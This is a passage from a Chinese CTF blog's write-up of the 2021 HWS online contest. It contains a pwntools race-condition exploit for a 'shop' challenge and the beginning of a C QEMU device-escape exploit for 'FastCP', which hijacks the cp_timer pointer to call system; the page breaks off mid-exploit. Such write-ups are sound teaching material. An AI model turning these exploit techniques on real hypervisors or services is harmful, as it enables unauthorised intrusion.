<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2021HWS线上赛-WP | nuoye's blog</title><meta name="description" content="2021HWS线上赛-WPshop存在条件竞争，可以多次卖出高价值物品，重复即可得到249元从而购买flag。 1234567891011121314151617181920from pwn import *p &#x3D; process(&quot;.&#x2F;pwn&quot;)p &#x3D; remote(&quot;node4.buuoj.cn&quot;,&quot;27664&quot;)def buy(idx):	p.sendline(&quot;2&quot;.ljust(0xf,&#39;"><meta name="keywords" content="ctf,WP,PWN"><meta name="author" content="nuoye"><meta name="copyright" content="nuoye"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://hm.baidu.com"/><link rel="dns-prefetch" href="https://hm.baidu.com"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="_pyFdIcmaCRoz088kKiZz3MCJ6t3M4uYNi090bltUBI"/><meta name="baidu-site-verification" content="BLwscaTvpI"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="2021HWS线上赛-WP"><meta name="twitter:description" content="2021HWS线上赛-WPshop存在条件竞争，可以多次卖出高价值物品，重复即可得到249元从而购买flag。 1234567891011121314151617181920from pwn import *p &#x3D; process(&quot;.&#x2F;pwn&quot;)p &#x3D; remote(&quot;node4.buuoj.cn&quot;,&quot;27664&quot;)def buy(idx):	p.sendline(&quot;2&quot;.ljust(0xf,&#39;"><meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="og:type" content="article"><meta property="og:title" content="2021HWS线上赛-WP"><meta property="og:url" content="https://nuoye-blog.github.io/2021/08/24/ffdb87e5/"><meta property="og:site_name" content="nuoye's blog"><meta property="og:description" content="2021HWS线上赛-WPshop存在条件竞争，可以多次卖出高价值物品，重复即可得到249元从而购买flag。 1234567891011121314151617181920from pwn import *p &#x3D; process(&quot;.&#x2F;pwn&quot;)p &#x3D; remote(&quot;node4.buuoj.cn&quot;,&quot;27664&quot;)def buy(idx):	p.sendline(&quot;2&quot;.ljust(0xf,&#39;"><meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="article:published_time" content="2021-08-24T07:00:00.000Z"><meta property="article:modified_time" content="2021-08-24T06:46:04.747Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://nuoye-blog.github.io/2021/08/24/ffdb87e5/"><link rel="next" title="2021CISCN初赛-WP(PWN)" href="https://nuoye-blog.github.io/2021/05/16/466a7375/"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5/js/md5.min.js"></script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?7024541a1af4db0c8c6fecf9353cb259";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://nuoye-blog.github.io/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="nuoye's blog" type="application/atom+xml">
</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">61</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">48</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="http://pwn.eonew.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> 星盟pwn平台</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021HWS线上赛-WP"><span class="toc-number">1.</span> <span class="toc-text">2021HWS线上赛-WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shop"><span class="toc-number">1.1.</span> <span class="toc-text">shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastCP"><span class="toc-number">1.2.</span> <span class="toc-text">FastCP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aet-reverse"><span class="toc-number">1.3.</span> <span class="toc-text">aet-reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#backdoor"><span class="toc-number">1.4.</span> <span class="toc-text">backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hello"><span class="toc-number">1.5.</span> <span class="toc-text">hello</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prophet"><span class="toc-number">1.6.</span> <span class="toc-text">prophet</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">nuoye's blog</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="http://pwn.eonew.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> 星盟pwn平台</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">2021HWS线上赛-WP</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-08-24 15:00:00"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2021-08-24</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2021-08-24 14:46:04"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2021-08-24</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/WP/">WP</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">3k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 17 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="2021HWS线上赛-WP"><a href="#2021HWS线上赛-WP" class="headerlink" title="2021HWS线上赛-WP"></a>2021HWS线上赛-WP</h1><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>存在条件竞争，可以多次卖出高价值物品，重复即可得到249元从而购买flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>,<span class="string">"27664"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>.ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.sendline(str(idx).ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">look</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"1"</span>.ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"3"</span>.ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.sendline(str(idx).ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line">buy(<span class="number">2</span>)</span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line">buy(<span class="number">1</span>)</span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#buy(1)</span></span><br><span class="line">look()</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#flag&#123;97d3afe8-8139-4219-801c-4f25418e73ac&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="FastCP"><a href="#FastCP" class="headerlink" title="FastCP"></a>FastCP</h2><p>qemu题目，根据launch.sh文件中<code>--device FastCP</code>确定关键词，再通过在ida里面搜索即可得到相关函数。</p>
<p>漏洞点存在于fastcp_cp_timer函数中：</p>
<ul>
<li>当cmd为4时，可以读取超出CP_buffer范围得到cp_timer函数指针的值</li>
<li>当cmd为1且CP_list_cnt大于0x10时，可以覆盖到cp_timer函数指针及其参数的地址</li>
</ul>
<p>通过cmd为4进行泄漏得到pie地址和CP_buffer，再通过cmd为1设置cp_timer为system函数地址，并覆盖其指向CP_buffer上存储命令的地址，再次执行即可获取flag。</p>
<p>exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">char</span> *dst;</span><br><span class="line"><span class="keyword">char</span> *src;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_dst;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_dst2;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_src;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_src2;</span><br><span class="line"><span class="keyword">uint64_t</span> pie_base;</span><br><span class="line"><span class="keyword">uint64_t</span> libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"execve:\n"</span></span><br><span class="line">	<span class="string">"mov $59,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"open:\n"</span></span><br><span class="line">	<span class="string">"mov $2,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"read:\n"</span></span><br><span class="line">	<span class="string">"mov $0,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"write:\n"</span></span><br><span class="line">	<span class="string">"mov $1,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"exit:\n"</span></span><br><span class="line">	<span class="string">"mov $60,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line">	</span><br><span class="line">        <span class="string">"mmap:\n"</span></span><br><span class="line">	<span class="string">"push %rcx\n"</span></span><br><span class="line">	<span class="string">"pop %r10\n"</span></span><br><span class="line">	<span class="string">"mov $9,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line">	</span><br><span class="line">	<span class="string">"sleep:\n"</span></span><br><span class="line">	<span class="string">"mov $230,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line">	</span><br><span class="line">	<span class="string">"lseek:\n"</span></span><br><span class="line">	<span class="string">"mov $8,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line">	</span><br><span class="line">	<span class="string">"close:\n"</span></span><br><span class="line">	<span class="string">"mov $3,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line">	</span><br><span class="line">	<span class="string">"mlock:\n"</span></span><br><span class="line">	<span class="string">"mov $149,%rax\n"</span></span><br><span class="line">	<span class="string">"syscall\n"</span></span><br><span class="line">	<span class="string">"ret\n"</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_info</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> CP_list_src;</span><br><span class="line">	<span class="keyword">uint64_t</span> CP_list_cnt;</span><br><span class="line">	<span class="keyword">uint64_t</span> CP_list_dst;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/proc/self/pagemap"</span>, <span class="number">0</span>);</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    <span class="comment">//assert(gfn != -1);</span></span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cp_list_src</span><span class="params">(<span class="keyword">uint64_t</span> value)</span></span>&#123;</span><br><span class="line">	mmio_write(<span class="number">8</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cp_list_cnt</span><span class="params">(<span class="keyword">uint64_t</span> value)</span></span>&#123;</span><br><span class="line">	mmio_write(<span class="number">16</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_cp</span><span class="params">(<span class="keyword">uint64_t</span> value)</span></span>&#123;</span><br><span class="line">	mmio_write(<span class="number">24</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">read_cmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> mmio_read(<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">read_cp_list_src</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> mmio_read(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">read_handling</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> mmio_read(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">read_cp_list_cnt</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> mmio_read(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(<span 